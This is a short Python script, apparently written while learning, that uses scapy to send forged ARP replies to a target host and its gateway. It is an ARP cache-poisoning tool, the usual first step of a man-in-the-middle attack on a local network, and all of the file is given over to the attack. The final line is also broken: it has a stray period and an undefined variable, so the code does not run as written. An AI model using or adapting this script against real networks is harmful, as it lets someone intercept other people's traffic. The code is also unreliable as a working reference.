#!/usr/bin/env python

import scapy.all as scapy
import argparse


def create_packet(target_ip, target_mac, source_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)  # op=2 stands for
    # the type of request
    scapy.send(packet)  # send the packet


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-ip", dest="target_ip", help="IP to target interface")
    parser.add_argument("--target-mac", dest="target_mac", help="MAC of target interface")
    parser.add_argument("-s", "--source-ip", dest="source", help="IP to source")
    parser.add_argument("--gateway-ip", dest="gateway_ip", help="IP to target gateway")
    parser.add_argument("--gateway-mac", dest="gateway_mac", help="MAC of gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Introduce target's IP")
    elif not options.target_mac:
        parser.error("Introduce target's MAC")
    elif not options.source:
        parser.error("Introduce source [YOU :) ]")
    elif not options.gateway_ip:
        parser.error("Introduce gateway's IP")
    elif not options.gateway_mac:
        parser.error("Introduce gateway's MAC")
    return options


arguments = get_argument()
create_packet(arguments.target_ip, arguments.target_mac, arguments.source)
create_packet(arguments.gateway_ip. options_gateway_mac, arguments.source)




